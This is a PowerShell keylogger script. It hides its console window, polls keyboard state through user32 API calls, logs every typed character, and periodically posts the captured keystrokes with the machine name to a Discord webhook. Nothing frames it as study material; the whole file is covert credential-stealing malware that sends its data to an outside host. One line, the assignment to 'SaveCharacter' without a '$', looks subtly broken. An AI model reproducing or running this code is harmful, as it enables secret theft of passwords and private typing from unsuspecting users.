$dc = "$dc"
if ($dc.Length -lt 120){
	$dc = ("discord.com/api/webhooks/" + "$dc")
}

$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if($hwnd -ne [System.IntPtr]::Zero){
    $Type::ShowWindowAsync($hwnd, 0)
}
else{
    $Host.UI.RawUI.WindowTitle = 'xxx'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'xxx' })
    $hwnd = $Proc.MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}

Function SendWH {
      $Escaped = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
      $escmsg = $timestamp+" : "+'`'+$Escaped+'`'
      $JsonWrapper = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
      IRM -Uri $dc -Method Post -ContentType "application/json" -Body $JsonWrapper
}

Function isKey {
        $iskeyPressed = $true
        $LastpressTime.Restart()
        $null = [console]::CapsLock
        $vtkey = $defs::MapVirtualKey($Collected, 3)
        $kbst = New-Object Byte[] 256
        $checkState = $defs::GetKeyboardState($kbst)
        SaveCharacter = New-Object -TypeName System.Text.StringBuilder  
}

$defs = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode);

    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);

    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);

    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);

    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern int GetWindowTextLength(IntPtr hWnd);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern bool IsWindowVisible(IntPtr hWnd);
}
'@

$defs = Add-Type -MemberDefinition $defs -Name 'Win32' -Namespace API -PassThru

$LastpressTime = [System.Diagnostics.Stopwatch]::StartNew()
$Threshold = [TimeSpan]::FromSeconds(10)

While ($true){
  $iskeyPressed = $false
    try{
      while ($LastpressTime.Elapsed -lt $Threshold) {
      Sleep -M 30
        for ($Collected = 8; $Collected -le 254; $Collected++){
        $keyst = $defs::GetAsyncKeyState($Collected)
          if ($keyst -eq -32767) {
		isKey         
            if ($defs::ToUnicode($Collected, $vtkey, $kbst, $SaveCharacter, $SaveCharacter.Capacity, 0)) {
              $LoggedString = $SaveCharacter.ToString()
                if ($Collected -eq 8) {$LoggedString = "[BACKSP]"}
                if ($Collected -eq 13) {$LoggedString = "[ENTER]"}
                if ($Collected -eq 27) {$LoggedString = "[ESC]"}
            $send += $LoggedString 
            }
          }
        }
      }
    }
    finally{
      If ($iskeyPressed) {
      SendWH
      $send = ""
      $iskeyPressed = $false
      }
    }
  $LastpressTime.Restart()
  Sleep -M 10
}

